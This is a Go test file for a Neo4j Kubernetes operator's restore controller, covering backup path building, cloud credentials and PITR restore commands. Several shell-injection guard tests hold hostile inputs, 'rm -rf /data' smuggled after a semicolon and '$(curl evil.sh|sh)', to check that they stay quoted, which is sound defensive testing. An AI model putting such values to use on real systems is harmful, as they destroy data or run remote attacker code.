package controller

import (
	"context"
	stderrors "errors"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	neo4jv1beta1 "github.com/neo4j-partners/neo4j-kubernetes-operator/api/v1beta1"
)

func TestBuildRestoreFromPath_S3(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "mydb-2026-04-08.backup",
				Storage: &neo4jv1beta1.StorageLocation{
					Type:   "s3",
					Bucket: "my-backup-bucket",
					Path:   "neo4j-backups",
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	path := r.buildRestoreFromPath(restore)
	assert.Equal(t, "s3://my-backup-bucket/neo4j-backups/mydb-2026-04-08.backup", path)
}

func TestBuildRestoreFromPath_GCS(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "graph.backup",
				Storage: &neo4jv1beta1.StorageLocation{
					Type:   "gcs",
					Bucket: "gcs-bucket",
					Path:   "backups/daily",
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	path := r.buildRestoreFromPath(restore)
	assert.Equal(t, "gs://gcs-bucket/backups/daily/graph.backup", path)
}

func TestBuildRestoreFromPath_Azure(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "neo4j.backup",
				Storage: &neo4jv1beta1.StorageLocation{
					Type:   "azure",
					Bucket: "storageaccount/container",
					Path:   "path",
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	path := r.buildRestoreFromPath(restore)
	assert.Equal(t, "azb://storageaccount/container/path/neo4j.backup", path)
}

func TestBuildRestoreFromPath_PVC(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "mybackup.backup",
				Storage: &neo4jv1beta1.StorageLocation{
					Type: "pvc",
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	path := r.buildRestoreFromPath(restore)
	assert.Equal(t, "/backup/mybackup.backup", path)
}

func TestBuildRestoreFromPath_NoStorage(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "local-path.backup",
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	path := r.buildRestoreFromPath(restore)
	assert.Equal(t, "local-path.backup", path)
}

func TestBuildRestoreCloudEnvVars_AWS(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Storage: &neo4jv1beta1.StorageLocation{
					Type: "s3",
					Cloud: &neo4jv1beta1.CloudBlock{
						Provider:             "aws",
						CredentialsSecretRef: "s3-creds",
						EndpointURL:          "https://minio.local:9000",
						ForcePathStyle:       true,
					},
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	envs := r.buildRestoreCloudEnvVars(restore)
	require.NotNil(t, envs)

	envMap := make(map[string]corev1.EnvVar)
	for _, e := range envs {
		envMap[e.Name] = e
	}

	assert.Contains(t, envMap, "AWS_ACCESS_KEY_ID")
	assert.Contains(t, envMap, "AWS_SECRET_ACCESS_KEY")
	assert.Contains(t, envMap, "AWS_REGION")
	assert.Equal(t, "s3-creds", envMap["AWS_ACCESS_KEY_ID"].ValueFrom.SecretKeyRef.Name)

	assert.Contains(t, envMap, "AWS_ENDPOINT_URL_S3")
	assert.Equal(t, "https://minio.local:9000", envMap["AWS_ENDPOINT_URL_S3"].Value)

	assert.Contains(t, envMap, "JAVA_TOOL_OPTIONS")
	assert.Equal(t, "-Daws.s3.forcePathStyle=true", envMap["JAVA_TOOL_OPTIONS"].Value)
}

func TestBuildRestoreCloudEnvVars_GCP(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Storage: &neo4jv1beta1.StorageLocation{
					Type: "gcs",
					Cloud: &neo4jv1beta1.CloudBlock{
						Provider:             "gcp",
						CredentialsSecretRef: "gcp-sa-key",
					},
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	envs := r.buildRestoreCloudEnvVars(restore)
	require.Len(t, envs, 1)
	assert.Equal(t, "GOOGLE_APPLICATION_CREDENTIALS", envs[0].Name)
	assert.Equal(t, "/var/secrets/gcp/credentials.json", envs[0].Value)
}

func TestBuildRestoreCloudEnvVars_Azure(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Storage: &neo4jv1beta1.StorageLocation{
					Type: "azure",
					Cloud: &neo4jv1beta1.CloudBlock{
						Provider:             "azure",
						CredentialsSecretRef: "azure-creds",
					},
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	envs := r.buildRestoreCloudEnvVars(restore)
	require.Len(t, envs, 2)
	assert.Equal(t, "AZURE_STORAGE_ACCOUNT", envs[0].Name)
	assert.Equal(t, "AZURE_STORAGE_KEY", envs[1].Name)
}

func TestBuildRestoreCloudEnvVars_NilWhenNoCloud(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type: "backup",
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	envs := r.buildRestoreCloudEnvVars(restore)
	assert.Nil(t, envs)
}

func TestBuildRestoreCloudEnvVars_NilWhenNoCredentials(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Storage: &neo4jv1beta1.StorageLocation{
					Type: "s3",
					Cloud: &neo4jv1beta1.CloudBlock{
						Provider: "aws",
						// No CredentialsSecretRef — relies on ambient identity (IRSA)
					},
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}
	envs := r.buildRestoreCloudEnvVars(restore)
	assert.Nil(t, envs, "should return nil when no credentials secret, allowing ambient cloud identity")
}

// ─── source.type=backup resolution (recheck gap 1) ──────────────────────────

// TestResolveRestoreSource_BackupRefDereferenceS3 verifies that
// source.type=backup picks up the referenced Neo4jBackup's full storage
// config (bucket, path, type, cloud creds) and the per-run BackupsPath
// from its most-recent Succeeded run. Pre-fix, the restore always
// pointed at `/backup/<backup-name>` over an EmptyDir.
func TestResolveRestoreSource_BackupRefDereferenceS3(t *testing.T) {
	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "daily-prod", Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jBackupSpec{
			Storage: neo4jv1beta1.StorageLocation{
				Type:   "s3",
				Bucket: "prod-bucket",
				Path:   "neo4j-backups/prod",
				Cloud: &neo4jv1beta1.CloudBlock{
					Provider:             "aws",
					CredentialsSecretRef: "aws-creds",
				},
			},
		},
		Status: neo4jv1beta1.Neo4jBackupStatus{
			History: []neo4jv1beta1.BackupRun{
				// Newest-first: most-recent Failed should be SKIPPED in favor
				// of the older Succeeded run.
				{RunID: "uid-latest", Status: "Failed", BackupsPath: "daily-prod-backup-cron-1738000000"},
				{RunID: "uid-prev", Status: "Succeeded", BackupsPath: "daily-prod-backup-cron-1737913600"},
			},
		},
	}
	r := &Neo4jRestoreReconciler{
		Client: fake.NewClientBuilder().WithScheme(newTestScheme()).WithObjects(backup).Build(),
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		ObjectMeta: metav1.ObjectMeta{Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{Type: "backup", BackupRef: "daily-prod"},
		},
	}

	src, err := r.resolveRestoreSource(context.Background(), restore)
	require.NoError(t, err)
	assert.Equal(t, "storage", src.Type, "Type must be normalized to 'storage' so the switch in buildRestoreCommand routes correctly")
	require.NotNil(t, src.Storage)
	assert.Equal(t, "s3", src.Storage.Type)
	assert.Equal(t, "prod-bucket", src.Storage.Bucket)
	assert.Equal(t, "neo4j-backups/prod", src.Storage.Path)
	require.NotNil(t, src.Storage.Cloud, "cloud block must be folded onto Storage.Cloud so cloudBlockForRestore finds it")
	assert.Equal(t, "aws", src.Storage.Cloud.Provider)
	assert.Equal(t, "aws-creds", src.Storage.Cloud.CredentialsSecretRef)
	assert.Equal(t, "daily-prod-backup-cron-1737913600", src.BackupPath,
		"BackupPath must be the per-run subfolder of the MOST RECENT SUCCEEDED run, not the latest run")

	// Sanity: the resolved view, when fed into buildRestoreFromPath, must
	// produce the full s3:// URI pointing at the per-run subfolder.
	tmp := &neo4jv1beta1.Neo4jRestore{Spec: neo4jv1beta1.Neo4jRestoreSpec{Source: src}}
	assert.Equal(t,
		"s3://prod-bucket/neo4j-backups/prod/daily-prod-backup-cron-1737913600",
		r.buildRestoreFromPath(tmp),
		"resolved view must produce the per-run s3:// URI")
}

// TestResolveRestoreSource_BackupRefDereferencePVC covers the PVC storage
// path: the resolver must NOT silently coerce to /backup/<backup-name>
// like the legacy code did — it must emit /backup/<run-subfolder>.
func TestResolveRestoreSource_BackupRefDereferencePVC(t *testing.T) {
	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "local-daily", Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jBackupSpec{
			Storage: neo4jv1beta1.StorageLocation{Type: "pvc"},
		},
		Status: neo4jv1beta1.Neo4jBackupStatus{
			History: []neo4jv1beta1.BackupRun{
				{RunID: "uid-1", Status: "Succeeded", BackupsPath: "local-daily-backup"},
			},
		},
	}
	r := &Neo4jRestoreReconciler{
		Client: fake.NewClientBuilder().WithScheme(newTestScheme()).WithObjects(backup).Build(),
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		ObjectMeta: metav1.ObjectMeta{Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{Type: "backup", BackupRef: "local-daily"},
		},
	}

	src, err := r.resolveRestoreSource(context.Background(), restore)
	require.NoError(t, err)

	tmp := &neo4jv1beta1.Neo4jRestore{Spec: neo4jv1beta1.Neo4jRestoreSpec{Source: src}}
	assert.Equal(t, "/backup/local-daily-backup", r.buildRestoreFromPath(tmp),
		"PVC restores must use the run-subfolder (Job name), not the Neo4jBackup CR name")
}

// TestResolveRestoreSource_BackupRefNoSucceededRun_IsTransient verifies
// that "no Succeeded run" returns errBackupNotReady (wrapped). The caller
// uses errors.Is to detect this and route to Pending+requeue instead of
// terminal Failed — restores created before the upstream backup
// completes auto-promote to Running once the backup catches up.
func TestResolveRestoreSource_BackupRefNoSucceededRun_IsTransient(t *testing.T) {
	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "pending", Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jBackupSpec{
			Storage: neo4jv1beta1.StorageLocation{Type: "s3", Bucket: "b"},
		},
		Status: neo4jv1beta1.Neo4jBackupStatus{
			History: []neo4jv1beta1.BackupRun{
				{RunID: "uid-1", Status: "Running"}, // no Succeeded yet
			},
		},
	}
	r := &Neo4jRestoreReconciler{
		Client: fake.NewClientBuilder().WithScheme(newTestScheme()).WithObjects(backup).Build(),
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		ObjectMeta: metav1.ObjectMeta{Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{Type: "backup", BackupRef: "pending"},
		},
	}

	_, err := r.resolveRestoreSource(context.Background(), restore)
	require.Error(t, err)
	assert.True(t, stderrors.Is(err, errBackupNotReady),
		"errors.Is must detect errBackupNotReady so startRestore routes to StatusPending instead of StatusFailed")
	assert.Contains(t, err.Error(), `Neo4jBackup "pending"`, "error message must name the backup CR")
}

// TestResolveRestoreSource_BackupRefMissingCR_IsPermanent verifies that
// the missing-CR error is NOT wrapped with errBackupNotReady — that is a
// permanent failure (typo? wrong namespace?), not a wait condition, and
// must NOT trigger an infinite Pending+requeue loop.
func TestResolveRestoreSource_BackupRefMissingCR_IsPermanent(t *testing.T) {
	r := &Neo4jRestoreReconciler{
		Client: fake.NewClientBuilder().WithScheme(newTestScheme()).Build(),
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		ObjectMeta: metav1.ObjectMeta{Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{Type: "backup", BackupRef: "typo"},
		},
	}

	_, err := r.resolveRestoreSource(context.Background(), restore)
	require.Error(t, err)
	assert.False(t, stderrors.Is(err, errBackupNotReady),
		"missing-CR error must be permanent (StatusFailed), not transient (StatusPending)")
}

// TestResolveRestoreSource_BackupRefNoSucceededRun verifies the loud-fail
// behavior when no run in history has Status=Succeeded. Silently picking
// a failed/missing run would produce a corrupt restore.
func TestResolveRestoreSource_BackupRefNoSucceededRun(t *testing.T) {
	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "broken", Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jBackupSpec{
			Storage: neo4jv1beta1.StorageLocation{Type: "s3", Bucket: "b"},
		},
		Status: neo4jv1beta1.Neo4jBackupStatus{
			History: []neo4jv1beta1.BackupRun{
				{RunID: "uid-1", Status: "Failed"},
				{RunID: "uid-2", Status: "Running"},
			},
		},
	}
	r := &Neo4jRestoreReconciler{
		Client: fake.NewClientBuilder().WithScheme(newTestScheme()).WithObjects(backup).Build(),
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		ObjectMeta: metav1.ObjectMeta{Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{Type: "backup", BackupRef: "broken"},
		},
	}

	_, err := r.resolveRestoreSource(context.Background(), restore)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "no Succeeded run")
}

// TestResolveRestoreSource_BackupRefMissingCR verifies error propagation
// when the referenced Neo4jBackup doesn't exist.
func TestResolveRestoreSource_BackupRefMissingCR(t *testing.T) {
	r := &Neo4jRestoreReconciler{
		Client: fake.NewClientBuilder().WithScheme(newTestScheme()).Build(),
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		ObjectMeta: metav1.ObjectMeta{Namespace: "neo4j"},
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{Type: "backup", BackupRef: "nope"},
		},
	}

	_, err := r.resolveRestoreSource(context.Background(), restore)
	require.Error(t, err)
	assert.Contains(t, err.Error(), `Neo4jBackup "nope"`)
}

// TestResolveRestoreSource_PassThroughForStorageType ensures the resolver
// is a no-op for source.type=storage — the existing happy path must not
// regress.
func TestResolveRestoreSource_PassThroughForStorageType(t *testing.T) {
	r := &Neo4jRestoreReconciler{
		Client: fake.NewClientBuilder().WithScheme(newTestScheme()).Build(),
	}
	original := neo4jv1beta1.RestoreSource{
		Type:       "storage",
		BackupPath: "mydb.backup",
		Storage:    &neo4jv1beta1.StorageLocation{Type: "s3", Bucket: "b"},
	}
	restore := &neo4jv1beta1.Neo4jRestore{Spec: neo4jv1beta1.Neo4jRestoreSpec{Source: original}}

	src, err := r.resolveRestoreSource(context.Background(), restore)
	require.NoError(t, err)
	assert.Equal(t, original, src, "source.type=storage must pass through unchanged")
}

// ─── existing tests below ───────────────────────────────────────────────────

func TestBuildRestoreFromPath_S3WithTempStorage(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "mydb.backup",
				Storage: &neo4jv1beta1.StorageLocation{
					Type:   "s3",
					Bucket: "bucket",
					Path:   "backups",
				},
			},
			Options: &neo4jv1beta1.RestoreOptionsSpec{
				TempStorage: &neo4jv1beta1.TempStorageSpec{
					Size: "50Gi",
				},
			},
		},
	}
	r := &Neo4jRestoreReconciler{}

	// Cloud URI should be constructed regardless of tempStorage
	path := r.buildRestoreFromPath(restore)
	assert.Equal(t, "s3://bucket/backups/mydb.backup", path)

	// Volume mounts should include temp-staging
	mounts := r.buildRestoreVolumeMounts(restore)
	hasTempMount := false
	for _, m := range mounts {
		if m.Name == "temp-staging" && m.MountPath == "/tmp/neo4j-staging" {
			hasTempMount = true
		}
	}
	assert.True(t, hasTempMount, "should mount temp-staging PVC at /tmp/neo4j-staging")
}

// TestBuildLocalRestoreFilePath_PVCResolvesToShellSubst pins the contract
// that PVC restores resolve --from-path via a shell command substitution
// `$(ls .../<dbname>-*.backup | tail -1)`.
//
// Why this matters: neo4j-admin 5.26 requires --from-path to point at a
// .backup FILE (not a directory). The operator's backup writes
//
//	/backup/<run-id>/<dbname>-<timestamp>.backup
//
// where <timestamp> is set at backup execution and not known to the
// operator. Resolving via the shell at Pod startup avoids both that lookup
// problem AND the cluster-target-backup multi-file directory issue (the
// glob naturally selects only the target DB's file).
func TestBuildLocalRestoreFilePath_PVCResolvesToShellSubst(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			DatabaseName: "neo4j",
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "roundtrip-backup-backup",
				Storage: &neo4jv1beta1.StorageLocation{
					Type: "pvc",
					PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
				},
			},
		},
	}
	got := buildLocalRestoreFilePath(restore, "/backup/roundtrip-backup-backup")
	assert.Equal(t,
		"$(ls '/backup/roundtrip-backup-backup'/'neo4j'-*.backup | tail -1)",
		got,
		"PVC restore must resolve --from-path via shell $() so neo4j-admin gets a file path, "+
			"not a directory; both backup-path and dbname are single-quoted to prevent injection")
}

// TestBuildLocalRestoreFilePath_NilStorageSkipped: when Source.Storage is
// nil (a malformed CR shape — Type=storage with no Storage block), the
// helper must NOT apply PVC fixups. Reason: the broader operator flow
// for nil-Storage is broken end-to-end:
//
//   - buildRestoreVolumes only adds a `backup-storage` volume when
//     Source.Storage != nil (so a nil-Storage Pod fails to start with
//     "volume not found").
//   - buildRestoreFromPath returns bare `BackupPath` (no `/backup/`
//     prefix) for nil-Storage, so applying shell substitution would
//     produce a relative path the restore Pod can't use.
//
// Treating nil-Storage as PVC here would create an inconsistency where
// our fixups assume a `/backup` mount that doesn't exist. The helper
// returns empty (no resolution); the rest of the broken nil-Storage
// path runs as-is and the Pod's startup failure surfaces the real
// problem clearly. The fundamental fix (reject nil-Storage at
// validation) is tracked as a follow-up — this test only pins the
// contract that fixups are NOT silently mis-applied.
func TestBuildLocalRestoreFilePath_NilStorageSkipped(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			DatabaseName: "neo4j",
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "some-backup",
				// Storage left nil intentionally — this is the broken
				// CR shape; we just want to ensure our helpers don't
				// mis-apply PVC fixups to it.
			},
		},
	}
	got := buildLocalRestoreFilePath(restore, "/backup/some-backup")
	assert.Empty(t, got,
		"nil Storage must NOT trigger resolution — buildRestoreVolumes wouldn't "+
			"add the backup-storage volume, so the resulting --from-path would "+
			"reference a mount that doesn't exist")
}

// TestBuildLocalRestoreFilePath_CloudSkipsResolution: cloud URIs (s3://,
// gs://, azb://) bypass shell-side resolution — neo4j-admin's native cloud
// readers select the correct file from the bucket/prefix, and the shell
// `ls` would have no filesystem to enumerate anyway.
func TestBuildLocalRestoreFilePath_CloudSkipsResolution(t *testing.T) {
	for _, storageType := range []string{"s3", "gcs", "azure"} {
		t.Run(storageType, func(t *testing.T) {
			restore := &neo4jv1beta1.Neo4jRestore{
				Spec: neo4jv1beta1.Neo4jRestoreSpec{
					DatabaseName: "neo4j",
					Source: neo4jv1beta1.RestoreSource{
						Type: "storage",
						Storage: &neo4jv1beta1.StorageLocation{
							Type:   storageType,
							Bucket: "my-bucket",
						},
					},
				},
			}
			got := buildLocalRestoreFilePath(restore, "s3://my-bucket/path")
			assert.Empty(t, got, "%s sources must NOT trigger shell resolution", storageType)
		})
	}
}

// TestBuildLocalRestoreFilePath_ShellInjectionGuard: spec.DatabaseName is
// user-controlled. shellQuote() wraps it in single quotes so a dbname
// containing shell metacharacters can't escape the glob and run extra
// commands. Defense-in-depth — the database name validator also rejects
// these — but pinning here prevents future refactors from dropping the
// quoting.
func TestBuildLocalRestoreFilePath_ShellInjectionGuard(t *testing.T) {
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			DatabaseName: "evil; rm -rf /data",
			Source: neo4jv1beta1.RestoreSource{
				Type:       "storage",
				BackupPath: "x",
				Storage:    &neo4jv1beta1.StorageLocation{Type: "pvc"},
			},
		},
	}
	got := buildLocalRestoreFilePath(restore, "/backup/x")
	// The single-quoted form `'evil; rm -rf /data'` makes the entire
	// dbname a single shell token inside the glob; the `;` is literal,
	// not a command separator. If shellQuote ever regresses, this fires.
	assert.Contains(t, got, "'evil; rm -rf /data'-*.backup",
		"dbname must be single-quoted so shell metacharacters stay literal")
	assert.NotContains(t, got, "; rm -rf /data ",
		"a successful injection would chain rm -rf as a separate command — must not happen")
}

// TestResolveLocalPVCFromPath_PVCPathGlobbed pins the path-based PVC
// resolution used by buildPITRRestoreCommand (which doesn't have a direct
// `Source.Storage` to inspect since the source is resolved through
// `BaseBackup`). The string `/backup` prefix is the canonical signal that
// the path is a local mount. Both the path AND the database name are
// shell-quoted to prevent injection via spec.source.backupPath.
func TestResolveLocalPVCFromPath_PVCPathGlobbed(t *testing.T) {
	got := resolveLocalPVCFromPath("/backup/daily-backup-cron-1738000000", "neo4j")
	assert.Equal(t,
		"$(ls '/backup/daily-backup-cron-1738000000'/'neo4j'-*.backup | tail -1)",
		got)
}

// TestResolveLocalPVCFromPath_BackupPathShellInjectionGuard locks in the
// quoting fix for the CVE-class issue where spec.source.backupPath flowed
// unquoted into the shell substitution. Without quoting, a backupPath
// like `foo; rm -rf /data #` produced:
//
//	$(ls /backup/foo; rm -rf /data #/'neo4j'-*.backup | tail -1)
//
// — the `;` terminates the `ls` and `rm -rf /data` executes inside the
// restore Pod, which mounts /data as ReadWrite (server-0's database PVC)
// and carries NEO4J_ADMIN_PASSWORD in its env. With quoting, the whole
// hostile string becomes a single literal argument to ls.
func TestResolveLocalPVCFromPath_BackupPathShellInjectionGuard(t *testing.T) {
	got := resolveLocalPVCFromPath("/backup/foo; rm -rf /data #", "neo4j")
	// The single-quoted form makes the entire `/backup/foo; rm -rf /data #`
	// a single shell token; the `;` is literal, not a command separator.
	assert.Contains(t, got, "'/backup/foo; rm -rf /data #'",
		"backupPath must be single-quoted as a single shell token")
	// Pin the exact output to catch any future refactor that drops the
	// quote on either input (backupPath OR dbname). The substitution
	// body when parsed by /bin/sh is:
	//   ls '/backup/foo; rm -rf /data #'/'neo4j'-*.backup | tail -1
	// which after quote removal is a single literal path argument to
	// `ls` — no command separator, no injection.
	assert.Equal(t,
		"$(ls '/backup/foo; rm -rf /data #'/'neo4j'-*.backup | tail -1)",
		got,
		"output must match the expected fully-quoted form exactly")
}

// TestResolveLocalPVCFromPath_NestedCommandSubstitutionGuard: a backupPath
// like `$(curl evil.sh|sh)` would, without quoting, be interpreted as a
// nested command substitution. Single-quoting prevents the `$(` from
// being parsed as a substitution opening.
func TestResolveLocalPVCFromPath_NestedCommandSubstitutionGuard(t *testing.T) {
	got := resolveLocalPVCFromPath("/backup/$(curl evil.sh|sh)", "neo4j")
	// Single-quoted: the `$(` is literal, not a substitution opener.
	assert.Contains(t, got, "'/backup/$(curl evil.sh|sh)'",
		"backupPath containing nested $() must be single-quoted so it's literal")
}

// TestResolveLocalPVCFromPath_EmbeddedSingleQuoteGuard: shellQuote handles
// embedded single quotes via the `'\”` idiom. This test verifies that
// even an adversarial input with `'` characters is correctly escaped.
func TestResolveLocalPVCFromPath_EmbeddedSingleQuoteGuard(t *testing.T) {
	got := resolveLocalPVCFromPath("/backup/foo'bar", "neo4j")
	// shellQuote produces 'foo'\''bar' for input foo'bar — the embedded
	// single quote is escaped via close-quote, backslash-quote, open-quote.
	// After shell quote removal the literal string is `/backup/foo'bar`,
	// which is a (very unusual but valid) Unix filename.
	assert.Contains(t, got, `'/backup/foo'\''bar'`,
		"embedded single quotes must use the close-escape-open idiom from shellQuote")
}

// TestResolveLocalPVCFromPath_CloudUnchanged: cloud URIs must NOT be
// transformed — neo4j-admin's native cloud readers handle per-file
// selection from the bucket prefix.
func TestResolveLocalPVCFromPath_CloudUnchanged(t *testing.T) {
	for _, uri := range []string{
		"s3://my-bucket/path/to/backup.backup",
		"gs://gcs-bucket/daily/neo4j-2026-01-01.backup",
		"azb://account/container/path",
	} {
		t.Run(uri, func(t *testing.T) {
			assert.Equal(t, uri, resolveLocalPVCFromPath(uri, "neo4j"),
				"%s must be passed through unchanged", uri)
		})
	}
}

// TestResolveLocalPVCFromPath_EmptyDBNameUnchanged: defensive — empty DB
// name skips substitution (validators catch upstream; this is the safety
// net).
func TestResolveLocalPVCFromPath_EmptyDBNameUnchanged(t *testing.T) {
	assert.Equal(t, "/backup/somedir",
		resolveLocalPVCFromPath("/backup/somedir", ""))
}

// TestIsPVCBackupPath: prefix-based PVC detection used by the PITR path.
// Anything under /backup is treated as PVC; URI schemes are treated as
// cloud (path unchanged, no prelude, no default temp-path).
func TestIsPVCBackupPath(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{"/backup/daily-cron-12345", true},
		{"/backup/some-file.backup", true},
		{"/backup", true},
		{"s3://bucket/path", false},
		{"gs://bucket/path", false},
		{"azb://account/container", false},
		{"/data/backups", false}, // explicit non-/backup path
		{"", false},
	}
	for _, tc := range cases {
		t.Run(tc.path, func(t *testing.T) {
			assert.Equal(t, tc.want, isPVCBackupPath(tc.path))
		})
	}
}

// TestBuildPITRRestoreCommand_PVCBaseBackupAppliesFixups verifies that
// PITR restores from a PVC-backed base backup (the most common shape: a
// Neo4jBackup CR's history entry referencing a per-run subfolder on a PVC)
// get the SAME shell-substitution + `mkdir -p` prelude + default
// --temp-path as non-PITR PVC restores. The reviewer originally flagged
// this as omitted; this test pins the fix.
func TestBuildPITRRestoreCommand_PVCBaseBackupAppliesFixups(t *testing.T) {
	cluster := &neo4jv1beta1.Neo4jEnterpriseCluster{
		Spec: neo4jv1beta1.Neo4jEnterpriseClusterSpec{
			Image: neo4jv1beta1.ImageSpec{Repo: "neo4j", Tag: "5.26-enterprise"},
		},
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			DatabaseName: "neo4j",
			Source: neo4jv1beta1.RestoreSource{
				Type: "pitr",
				PITR: &neo4jv1beta1.PITRConfig{
					BaseBackup: &neo4jv1beta1.BaseBackupSource{
						Type: "storage",
						Storage: &neo4jv1beta1.StorageLocation{
							Type: "pvc",
						},
						BackupPath: "daily-backup-cron-1738000000",
					},
				},
			},
		},
	}

	r := &Neo4jRestoreReconciler{}
	cmd, err := r.buildPITRRestoreCommand(context.Background(), restore, cluster)
	require.NoError(t, err)

	// Shell-substitution form for --from-path (FILE, not directory).
	// Both backup-path and dbname are single-quoted to prevent shell
	// injection via spec.source.backupPath.
	assert.Contains(t, cmd, "--from-path=$(ls '/backup/daily-backup-cron-1738000000'/'neo4j'-*.backup | tail -1)",
		"PITR PVC path must use shell substitution to resolve to a single .backup file")
	// Prelude that creates the empty temp dir
	assert.Contains(t, cmd, "rm -rf /tmp/restore-tmp && mkdir -p /tmp/restore-tmp",
		"PITR PVC path must include the temp-dir setup prelude")
	// Default --temp-path so neo4j-admin doesn't try to extract into the
	// ReadOnly-mounted /backup
	assert.Contains(t, cmd, "--temp-path=/tmp/restore-tmp",
		"PITR PVC path must default --temp-path to the writable tmpfs")
}

// TestBuildPITRRestoreCommand_CloudBaseBackupNoFixups: cloud-source PITR
// restores must NOT pick up the PVC-specific fixups. neo4j-admin's native
// cloud readers handle per-file selection; injecting `ls` would fail
// because there's no local filesystem to enumerate.
func TestBuildPITRRestoreCommand_CloudBaseBackupNoFixups(t *testing.T) {
	cluster := &neo4jv1beta1.Neo4jEnterpriseCluster{
		Spec: neo4jv1beta1.Neo4jEnterpriseClusterSpec{
			Image: neo4jv1beta1.ImageSpec{Repo: "neo4j", Tag: "5.26-enterprise"},
		},
	}
	restore := &neo4jv1beta1.Neo4jRestore{
		Spec: neo4jv1beta1.Neo4jRestoreSpec{
			DatabaseName: "neo4j",
			Source: neo4jv1beta1.RestoreSource{
				Type: "pitr",
				PITR: &neo4jv1beta1.PITRConfig{
					BaseBackup: &neo4jv1beta1.BaseBackupSource{
						Type: "storage",
						Storage: &neo4jv1beta1.StorageLocation{
							Type:   "s3",
							Bucket: "my-bucket",
							Path:   "neo4j-backups",
						},
						BackupPath: "neo4j-2026-01-01.backup",
					},
				},
			},
		},
	}

